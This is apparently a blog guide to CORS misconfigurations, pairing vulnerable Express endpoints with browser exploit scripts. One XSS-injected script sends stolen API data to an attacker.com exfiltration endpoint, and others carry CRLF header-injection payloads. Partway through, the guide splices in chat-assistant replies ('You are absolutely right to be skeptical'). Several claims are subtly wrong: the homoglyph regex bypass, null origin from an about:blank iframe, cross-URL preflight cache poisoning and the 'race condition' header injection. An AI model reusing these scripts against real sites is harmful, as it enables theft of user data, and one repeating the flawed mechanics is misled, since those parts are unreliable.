---
title: A Comprehensive Guide to CORS Vulnerabilities
date: 2025-11-29
category: guides
tags:
  - web
  - cors
---

Table of Contents
-----------------

1.  [Introduction: What is CORS?](#Introduction-What-is-CORS)
2.  [Fundamental Concepts](#Fundamental-Concepts)
    *   [Same-Origin Policy (SOP)](#Same-Origin-Policy-SOP)
    *   [How CORS Works: Simple vs. Preflight Requests](#How-CORS-Works-Simple-vs-Preflight-Requests)
    *   [Key HTTP Headers](#Key-HTTP-Headers)
3.  [The Core Question: When is Data Reading Possible?](#The-Core-Question-When-is-Data-Reading-Possible)
4.  [CORS Vulnerability Scenarios](#CORS-Vulnerability-Scenarios)
    *   [Scenario 0: The "Blocked by Design" Case](#Scenario-0-The-“Blocked-by-Design”-Case)
    *   [Misconfiguration #1: Origin Reflection](#Misconfiguration-1-Origin-Reflection)
    *   [Misconfiguration #2: Whitelist Bypass (Suffix Match)](#Misconfiguration-2-Whitelist-Bypass-Suffix-Match)
    *   [Misconfiguration #3: Trusted Subdomain + XSS](#Misconfiguration-3-Trusted-Subdomain-XSS)
    *   [Misconfiguration #4: Trusting `null` Origin](#Misconfiguration-4-Trusting-null-Origin)
    *   [Misconfiguration #5: Regex Flaws (Unicode/Homograph)](#Misconfiguration-5-Regex-Flaws-Unicode-Homograph)
    *   [Misconfiguration #6: Preflight Request Caching Poisoning](#Misconfiguration-6-Preflight-Request-Caching-Poisoning)
    *   [Misconfiguration #7: CORS Header Injection](#Misconfiguration-7-CORS-Header-Injection)
5.  [The Relationship Between CORS and CSRF](#The-Relationship-Between-CORS-and-CSRF)
6.  [Developer Best Practices Checklist](#Developer-Best-Practices-Checklist)
7.  [Conclusion](#Conclusion)

* * *

Introduction: What is CORS?
---------------------------

Cross-Origin Resource Sharing (CORS) is a security mechanism implemented by web browsers. Its purpose is to control how web pages on one origin (domain) can request resources from another origin. It exists as a relaxed version of the stricter Same-Origin Policy (SOP), allowing for controlled cross-origin interactions essential for modern web applications (e.g., APIs, fonts, etc.).

A **CORS vulnerability** occurs when a web server is misconfigured, allowing an unintended origin to access sensitive resources, leading to data theft.

* * *

Fundamental Concepts
--------------------

### Same-Origin Policy (SOP)

The SOP is a foundational security rule. It prevents a document or script loaded from one origin from interacting with a resource from another origin. An **origin** is defined by the combination of **protocol (scheme), hostname, and port**.

*   `https://www.example.com:443` is a different origin from `http://www.example.com:80`.
*   `https://api.example.com` is a different origin from `https://www.example.com`.

Without SOP, a script on `attacker.com` could make a request to your bank's website (`bank.com`) while you're logged in, and read your account balance.

### How CORS Works: Simple vs. Preflight Requests

CORS works by adding new HTTP headers that allow browsers and servers to communicate about whether a cross-origin request is permitted.

1.  **Simple Requests:** Some requests are "simple" and don't require a pre-flight check. They must be one of:
    
    *   Methods: `GET`, `HEAD`, `POST`.
    *   Headers (excluding `User-Agent`): `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`.
    *   `Content-Type` value: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`.
2.  **Preflight Requests:** For any request that doesn't meet the "simple" criteria (e.g., `PUT` request, `Content-Type: application/json`, or custom headers like `Authorization`), the browser first sends an **HTTP `OPTIONS` request** to the server. This is the "preflight." The server responds with headers indicating if the actual request is allowed. Only if the preflight is successful does the browser send the actual request.
    

### Key HTTP Headers

| Header                         | Type     | Purpose                                                                                                                                                       |
|--------------------------------|----------|----------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Origin**                     | Request  | Sent by the browser with every cross-origin request. Indicates the origin of the requesting page (e.g., `https://attacker.com`).                               |
| **Access-Control-Allow-Origin** (ACAO) | Response | Specifies which origin(s) are allowed to access the resource. Can be `*` or a specific origin.                                                                |
| **Access-Control-Allow-Credentials** (ACAC) | Response | If `true`, allows the browser to include credentials (cookies, HTTP auth) and exposes the response to frontend JavaScript.                                    |
| **Access-Control-Allow-Methods** (ACAM) | Response | Sent in response to a preflight `OPTIONS` request. Lists allowed HTTP methods (e.g., `GET, POST, PUT`).                                                       |
| **Access-Control-Allow-Headers** (ACAH) | Response | Sent in response to a preflight `OPTIONS` request. Lists allowed custom request headers.                                                                      |
| **Access-Control-Max-Age**     | Response | Sent in response to a preflight `OPTIONS` request. Specifies how long the preflight results can be cached.                                                    |

* * *

The Core Question: When is Data Reading Possible?
-------------------------------------------------

This table clarifies the browser's behavior based on the server's response headers, specifically for authenticated requests (`credentials: 'include'`).

| Server Response Headers                                   | Browser Action                                   | Result for Attacker                                                                                  |
|-----------------------------------------------------------|--------------------------------------------------|--------------------------------------------------------------------------------------------------------|
| `ACAO: *` <br> `ACAC: true`                               | **BLOCKS** the script from reading the response  | **Data reading NOT possible.** Browser forbids this insecure combination.                              |
| `ACAO: https://attacker.com` <br> `ACAC: true`            | **ALLOWS** the script to read the response       | **Data reading IS possible.** Origin matches and credentials allowed.                                  |
| `ACAO: *` <br> `ACAC: false` (or absent)                  | **ALLOWS** script to read the response           | **Data reading IS possible but only for non-auth data.** Cookies not sent, only public data readable.  |
| `ACAO: https://victim.com` <br> `ACAC: true`              | **BLOCKS** the script from reading the response  | **Data reading NOT possible.** Origin mismatch makes response opaque.                                  |
| No `ACAO` header                                          | **BLOCKS** the script from reading the response  | **Data reading NOT possible.** SOP default behavior enforced.                                          |

CORS Vulnerability Scenarios
----------------------------

### Scenario 0: The "Blocked by Design" Case

This is the scenario from your original question. It is **not** a vulnerability, but a security feature.

*   **Description:** The server uses a wildcard `ACAO` but also sets `ACAC` to `true`.
*   **Can Attacker Read Data?:** No.
*   **Browser Behavior:** The browser will send the request with credentials, but when it sees the response headers `ACAO: *` and `ACAC: true`, it will throw a console error and prevent the attacker's JavaScript from accessing the response data.

**Vulnerable Server-Side Code:**

    // This is NOT vulnerable, it's a secure configuration that blocks the attack.
    app.get('/secure-profile', (req, res) => {
        res.setHeader('Access-Control-Allow-Origin', '*'); // Wildcard
        res.setHeader('Access-Control-Allow-Credentials', 'true'); // Forbidden combination
        res.json({ message: "You will not be able to read this." });
    });
    

**Attacker Exploit Code:**

    // This script will FAIL to read the data.
    fetch('https://victim.com/secure-profile', {
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        // This block will NOT be executed.
        console.log('Leaked data:', data);
    })
    .catch(error => {
        // An error will be logged to the console.
        console.error('Failed:', error);
    });
    

* * *

### Misconfiguration #1: Origin Reflection

The most common and dangerous CORS vulnerability.

*   **Description:** The server takes the `Origin` header from the request and blindly echoes it back into the `ACAO` response header.
*   **Can Attacker Read Data?:** Yes.
*   **Browser Behavior:** The browser sends `Origin: https://attacker.com`. The server responds with `ACAO: https://attacker.com`. The browser sees a perfect match and allows the script to read the response.

**Vulnerable Server-Side Code:**

    // VULNERABLE: Blindly reflecting the Origin header.
    app.get('/vulnerable-reflection', (req, res) => {
        const origin = req.headers.origin;
        res.setHeader('Access-Control-Allow-Origin', origin); // <-- VULNERABILITY!
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.json({ userId: 1337, apiKey: 'SECRET_KEY_12345' });
    });
    

**Attacker Exploit Code:**

    // This script will SUCCESSFULLY read the data.
    fetch('https://victim.com/vulnerable-reflection', {
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        // SUCCESS! The data is logged.
        console.log('Leaked data:', data);
    });
    

* * *

### Misconfiguration #2: Whitelist Bypass (Suffix Match)

The server attempts to validate the origin but uses flawed logic.

*   **Description:** The server checks if the origin string ends with a trusted domain (e.g., `victim.com`).
*   **Can Attacker Read Data?:** Yes.
*   **Browser Behavior:** The attacker registers a domain like `victim.com.attacker.com`. The server's check `origin.endsWith('victim.com')` passes, and the server responds with `ACAO: https://victim.com.attacker.com`. The browser allows the read.

**Vulnerable Server-Side Code:**

    // VULNERABLE: Flawed suffix validation logic.
    app.get('/vulnerable-suffix', (req, res) => {
        const origin = req.headers.origin;
        if (origin && origin.endsWith('victim.com')) { // <-- VULNERABILITY!
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Access-Control-Allow-Credentials', 'true');
        }
        res.json({ userId: 1337, apiKey: 'SECRET_KEY_12345' });
    });
    

**Attacker Exploit Code:**

    // This script, hosted on 'victim.com.attacker.com', will SUCCESSFULLY read the data.
    fetch('https://victim.com/vulnerable-suffix', {
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        console.log('Leaked data:', data);
    });
    

* * *

### Misconfiguration #3: Trusted Subdomain + XSS

This is a chained attack where a secure CORS policy is undermined by another vulnerability.

*   **Description:** `api.victim.com` correctly trusts only `https://www.victim.com`. However, `www.victim.com` has a Cross-Site Scripting (XSS) vulnerability.
*   **Can Attacker Read Data?:** Yes.
*   **Browser Behavior:** The attacker doesn't attack CORS directly. They inject JavaScript into `www.victim.com`. This injected script, running in a trusted origin, makes a request to `api.victim.com`. The CORS policy sees the origin as `https://www.victim.com` and correctly allows the request, giving the attacker access to the data via the XSS bridge.

**Vulnerable Server-Side Code:**

    // This API endpoint is SECURE on its own.
    // The vulnerability lies elsewhere (e.g., XSS on www.victim.com).
    app.get('/api-trusted-subdomain', (req, res) => {
        const origin = req.headers.origin;
        const trustedOrigin = 'https://www.victim.com';
        if (origin === trustedOrigin) { // Secure check
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Access-Control-Allow-Credentials', 'true');
        }
        res.json({ userId: 1337, apiKey: 'SECRET_KEY_12345' });
    });
    

**Attacker Exploit Code (Injected via XSS):**

    // This code would be injected into a page on www.victim.com.
    // It runs in the 'www.victim.com' origin.
    fetch('https://api.victim.com/api-trusted-subdomain', {
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        // SUCCESS! Data is exfiltrated to the attacker's server.
        fetch('https://attacker.com/exfiltrate', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
    

* * *

### Misconfiguration #4: Trusting `null` Origin

A misconfiguration where the server trusts requests from sandboxed contexts.

*   **Description:** The server's whitelist includes the `null` origin.
*   **Can Attacker Read Data?:** Yes.
*   **Browser Behavior:** The attacker can force the `Origin` to be `null` by making the request from a sandboxed `iframe`. The server sees `Origin: null`, matches it to its whitelist, and responds with `ACAO: null`. The browser allows the read.

**Vulnerable Server-Side Code:**

    // VULNERABLE: Trusts the 'null' origin.
    app.get('/vulnerable-null', (req, res) => {
        const origin = req.headers.origin;
        if (origin === 'null') { // <-- VULNERABILITY!
            res.setHeader('Access-Control-Allow-Origin', 'null');
            res.setHeader('Access-Control-Allow-Credentials', 'true');
        }
        res.json({ userId: 1337, apiKey: 'SECRET_KEY_12345' });
    });
    

**Attacker Exploit Code:**

    // The attacker creates a sandboxed iframe to force a null origin.
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    // 'about:blank' or a sandboxed iframe results in a null origin.
    iframe.src = 'about:blank'; 
    document.body.appendChild(iframe);
    
    // Use the iframe's window to make the request.
    iframe.contentWindow.fetch('https://victim.com/vulnerable-null', {
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        // SUCCESS! The data is read.
        console.log('Leaked data:', data);
    });
    

* * *

### Misconfiguration #5: Regex Flaws (Unicode/Homograph)

The server's validation regex can be bypassed using visually similar characters.

*   **Description:** The server uses a regex to validate the origin, but the regex doesn't account for internationalized domain names (IDNs) that use homoglyphs (visually identical characters).
*   **Can Attacker Read Data?:** Yes.
*   **Browser Behavior:** The attacker registers a domain like `vıctım.com` (using a dotless 'ı' and 'ı' instead of 'i'). A naive regex might not distinguish these, allowing the request.

**Vulnerable Server-Side Code:**

    // VULNERABLE: Regex does not account for homoglyphs.
    app.get('/vulnerable-regex', (req, res) => {
        const origin = req.headers.origin;
        // This regex is meant to match 'victim.com' but is easily bypassed.
        const regex = /^https:\/\/www\.victim\.com$/;
        if (origin && regex.test(origin)) { // <-- VULNERABILITY!
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Access-Control-Allow-Credentials', 'true');
        }
        res.json({ userId: 1337, apiKey: 'SECRET_KEY_12345' });
    });
    

**Attacker Exploit Code:**

    // This script, hosted on 'https://vıctım.com', will SUCCESSFULLY read the data.
    fetch('https://victim.com/vulnerable-regex', {
        credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
        console.log('Leaked data:', data);
    });
    

* * *

### Misconfiguration #6: Preflight Request Caching Poisoning

An advanced attack where a long cache time on a preflight request is exploited.

*   **Description:** This attack requires two separate vulnerabilities on the victim's server: (1) a sensitive API endpoint that has a very long `Access-Control-Max-Age` on its preflight response, and (2) a _different_ endpoint vulnerable to HTTP Header Injection (e.g., via CRLF injection). The attacker uses the second vulnerability to inject a permissive `Access-Control-Allow-Origin` header into the preflight response for the first endpoint, which then gets cached by the browser.
*   **Can Attacker Read Data?:** Yes (Indirectly).
*   **Browser Behavior:** The attacker first forces the browser to make a preflight request that triggers the header injection vulnerability. The server responds with injected, permissive CORS headers and a long `Max-Age`. The browser caches this "poisoned" preflight result. Then, when the attacker's script makes a real request to the sensitive endpoint, the browser uses the cached (and now permissive) preflight result, allowing the request and the response data to be read.

**Vulnerable Server-Side Code:**

    // This endpoint is vulnerable to having its preflight cache poisoned
    // because another endpoint on the server allows header injection.
    app.options('/api/sensitive-data', (req, res) => {
        const origin = req.headers.origin;
        // VULNERABILITY: Reflects origin and caches for a very long time.
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Access-Control-Max-Age', '86400'); // Cache for 24 hours
        res.status(200).end();
    });
    
    app.post('/api/sensitive-data', (req, res) => {
        res.json({ userId: 1337, apiKey: 'SECRET_KEY_12345' });
    });
    

**Attacker Exploit Code (Corrected):**

    // This attack requires chaining with a CRLF/Header Injection vulnerability.
    // The attacker CANNOT set the Origin header. The browser sets it automatically
    // to 'https://attacker.com' for this script.
    
    const targetUrl = 'https://victim.com/api/sensitive-data';
    
    // Step 1: Poison the preflight cache.
    // The attacker makes a request to an endpoint vulnerable to CRLF injection.
    // The crafted payload injects permissive CORS headers into the response.
    // The browser will cache this response for the targetUrl.
    fetch('https://victim.com/redirect?url=https://attacker.com%0d%0aAccess-Control-Allow-Origin: https://attacker.com%0d%0aAccess-Control-Allow-Credentials: true%0d%0aAccess-Control-Max-Age: 86400', {
        method: 'OPTIONS' // This makes it a preflight request
    }).then(() => {
        // Step 2: Make the actual request to the target.
        // The browser uses the cached (poisoned) preflight response, allowing the request.
        return fetch(targetUrl, {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' }
        });
    }).then(response => response.json())
    .then(data => {
        // SUCCESS! The data is exfiltrated if the cache poisoning worked.
        console.log('Leaked data:', data);
    })
    .catch(error => {
        console.error('Exploit failed. This attack is complex and highly dependent on server behavior.', error);
    });
    

Excellent questions. You've hit on the two most confusing and critical parts of this advanced attack. Let's break them down.

You are absolutely right to be skeptical. The way I initially described it was a bit of a simplification. Let's get into the real mechanics.

### Part 1: How Does Putting a Header in a URL Work? (The CRLF Injection)

This is the foundation of the attack. It's a vulnerability called **CRLF Injection**, sometimes called **HTTP Response Splitting**.

*   **CRLF** stands for **C**arriage **R**eturn (`\r`) and **L**ine **F**eed (`\n`). In the HTTP protocol, the combination `\r\n` is what separates one header from the next.
*   Imagine a server that takes a URL parameter and, without sanitizing it, puts it into an HTTP response header.

**Vulnerable Server Code:**

    // An endpoint that takes a 'next' parameter for a redirect.
    app.get('/redirect', (req, res) => {
        const nextPage = req.query.next; // e.g., /home
        // VULNERABILITY: The input is placed directly into a header.
        res.setHeader('Location', nextPage); 
        res.status(302).send();
    });
    

**Normal Usage:** A user clicks a link to: `https://victim.com/redirect?next=/dashboard`

The server sends back this HTTP response:

    HTTP/1.1 302 Found
    Location: /dashboard
    ...
    

This is perfectly fine.

**Malicious Usage (CRLF Injection):** An attacker crafts a special URL. They use URL-encoded characters for CRLF: `%0d%0a`. `https://victim.com/redirect?next=/dashboard%0d%0aAccess-Control-Allow-Origin: https://attacker.com%0d%0aAccess-Control-Allow-Credentials: true`

When the server processes this, it takes the entire string from the `next` parameter and puts it in the `Location` header. The resulting HTTP response looks like this to the browser:

    HTTP/1.1 302 Found
    Location: /dashboard
    Access-Control-Allow-Origin: https://attacker.com
    Access-Control-Allow-Credentials: true
    ...
    

The server's code only _intended_ to set the `Location` header, but the injected `\r\n` characters tricked it into creating **two additional, completely new headers**. The browser now sees a response that appears to legitimately allow requests from `attacker.com`.

* * *

### Part 2: Why Two Requests? (The Strategy of Cache Poisoning)

Now for your second, more brilliant question: If you can inject headers, why not just do it all at once?

The answer lies in the **separation of vulnerabilities**.

1.  **The Sensitive Endpoint is Secure:** The API endpoint with the valuable data (`/api/sensitive-data`) is likely well-coded. It does _not_ have a CRLF injection vulnerability. Its only "flaw" is having a long `Access-Control-Max-Age`.
2.  **The Vulnerable Endpoint is Useless:** The endpoint with the CRLF injection (`/redirect`) doesn't have any sensitive data. It's just a redirector.

The attacker's goal is to combine these two facts: **Make the browser believe that the permissive headers from the vulnerable `/redirect` endpoint apply to the secure `/api/sensitive-data` endpoint.**

The browser's preflight cache is the only way to bridge this gap.

#### The Refined Attack Flow (More Realistic)

The attacker doesn't make two separate `fetch` calls. Instead, they make **one `fetch` call to the target endpoint**, but they exploit a server flaw to trigger the CRLF injection _during that request_.

This usually happens if the server uses a front controller or a common middleware that processes all requests, and some part of it is vulnerable.

**Vulnerable Server Architecture (Conceptual):** Imagine some middleware on the server runs on every request and is vulnerable.

    // This middleware runs on ALL requests, including /api/sensitive-data
    app.use((req, res, next) => {
        // A 'debug' parameter can be used to inject headers. VULNERABLE!
        if (req.query.debug) {
            res.setHeader('X-Debug-Info', req.query.debug); 
        }
        next(); // Continue to the actual API endpoint
    });
    
    // The secure API endpoint
    app.post('/api/sensitive-data', (req, res) => {
        // ... secure logic ...
        res.json({ data: 'secret' });
    });
    

**The Attacker's Single, Clever Request:**

The attacker's script doesn't need to be complex. It just makes one request, but with a poisoned URL.

**Corrected Attacker Exploit Code (More Realistic):**

    // The attacker makes ONE request to the target URL.
    // But the URL itself contains the CRLF injection payload.
    const targetUrl = 'https://victim.com/api/sensitive-data?debug=whatever%0d%0aAccess-Control-Allow-Origin: https://attacker.com%0d%0aAccess-Control-Allow-Credentials: true%0d%0aAccess-Control-Max-Age: 86400';
    
    // The browser will automatically send a preflight OPTIONS request first.
    // The vulnerable middleware will inject the headers into the preflight response.
    // The browser will cache this poisoned preflight response.
    fetch(targetUrl, {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' }
    }).then(response => response.json())
    .then(data => {
        // The browser used the cached preflight, so the actual POST request succeeds.
        // SUCCESS! The data is exfiltrated.
        console.log('Leaked data:', data);
    })
    .catch(error => {
        console.error('Exploit failed.', error);
    });
    

### Summary: Why This Works

*   **You can't set the `Origin` header.** Correct. The browser sends `Origin: https://attacker.com` automatically.
*   **You inject OTHER headers.** You use CRLF injection to trick the _server_ into sending back `Access-Control-Allow-Origin: https://attacker.com`.
*   **You don't make two requests.** You make **one request** to the target, but you exploit a server flaw to poison the **preflight** part of that request.
*   **The cache is the bridge.** The long `Access-Control-Max-Age` in the poisoned preflight response means that for the next 24 hours, any request from `attacker.com` to that endpoint will be allowed by the browser without a new preflight check.

This is why it's an "advanced" attack. It requires a very specific combination of server-side flaws (a CRLF injection in a common code path + a long cache time on a preflight) and a deep understanding of how the browser's preflight cache works.

* * *

### Misconfiguration #7: CORS Header Injection

An attacker injects a CORS header via another vulnerability, like an open redirect.

*   **Description:** An unrelated endpoint on `victim.com` reflects user input into a response header. The attacker uses this to inject a permissive `ACAO` header.
*   **Can Attacker Read Data?:** Yes (Race condition dependent).
*   **Browser Behavior:** The attacker crafts a URL that injects their origin into the `ACAO` header. They then make a request to this URL. Due to browser request pipelining or caching quirks, there's a chance the browser might associate the injected header with a subsequent request to a sensitive endpoint, allowing a read.

**Vulnerable Server-Side Code:**

    // VULNERABLE: Reflects user input directly into a header.
    app.get('/redirect', (req, res) => {
        const url = req.query.url;
        // VULNERABILITY: Header injection.
        res.setHeader('Access-Control-Allow-Origin', url);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.send(`Redirecting to ${url}...`);
    });
    

**Attacker Exploit Code (Conceptual):**

    // Attacker uses the vulnerable redirect endpoint to inject their origin.
    const injectionUrl = 'https://victim.com/redirect?url=https://attacker.com';
    
    // Make a request to the vulnerable endpoint.
    fetch(injectionUrl, { credentials: 'include' })
    .then(() => {
        // Immediately make a request to the target. This is a race condition.
        return fetch('https://victim.com/vulnerable-reflection', { credentials: 'include' });
    })
    .then(response => response.json())
    .then(data => {
        console.log('Leaked data:', data);
    });
    

* * *

The Relationship Between CORS and CSRF
--------------------------------------

**Cross-Site Request Forgery (CSRF)** is an attack that tricks a victim into submitting a malicious request to a web application where they are currently authenticated. It exploits the trust a site has in a user's browser.

*   **CSRF is about _actions_:** The attacker makes the victim's browser perform an action (e.g., change password, delete post).
*   **CORS is about _reading responses_:** A vulnerable CORS policy allows the attacker to _read the result_ of that action.

| Scenario                       | CSRF Possible? | Data Reading via CORS Possible? | Outcome                                                                                                                                           |
|--------------------------------|----------------|----------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------|
| **Secure Site (No CORS)**      | Yes            | No                               | Attacker can trigger an action (e.g., change password) but **cannot see** the result page.                                                       |
| **Secure CORS (Whitelist)**    | No             | No                               | A `POST` request from `attacker.com` to `bank.com` is blocked by preflight. **CORS acts as a CSRF defense** since attacker origin isn't allowed. |
| **Vulnerable CORS (Reflection)** | Yes          | Yes                              | Worst case: attacker can trigger an action **and** read sensitive data (account balance, new password, etc.).                                    |

**In summary:**

*   A **properly configured** CORS policy (e.g., `ACAO: https://trusted-site.com`) can be an effective **defense against CSRF** for state-changing requests that require a preflight.
*   A **misconfigured** CORS policy (e.g., origin reflection) **exacerbates the impact of CSRF** by enabling data exfiltration.

* * *

Developer Best Practices Checklist
----------------------------------

To prevent CORS vulnerabilities, follow these rules:

1.  **NEVER use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.** Browsers will block this, but it indicates a misunderstanding of the security model.
2.  **DO NOT blindly reflect the `Origin` header.** This is the most common vulnerability.
3.  **Use a strict whitelist.** Only allow origins that absolutely need access.
4.  **Validate your whitelist logic carefully.** Avoid suffix checks (`endsWith`) and use exact string matching.
5.  **Be careful with regular expressions.** Test them thoroughly against edge cases, including Unicode/homoglyph attacks.
6.  **Avoid trusting the `null` origin** unless you have a specific, sandboxed use case that requires it.
7.  **Set `Access-Control-Max-Age` to a reasonable value.** Don't cache preflight requests for days unless absolutely necessary.
8.  **Remember CORS is not a replacement for CSRF tokens.** For defense-in-depth, still use anti-CSRF tokens on state-changing endpoints, as they protect against a wider range of attack vectors.

* * *

Conclusion
----------

CORS is a powerful but complex mechanism. When configured correctly, it enables a rich, interconnected web. When misconfigured, it becomes a critical vulnerability, allowing attackers to bypass the Same-Origin Policy and steal sensitive user data. By understanding the fundamental principles, recognizing common misconfigurations, and adhering to best practices, developers can secure their applications and defenders can effectively test for these flaws.
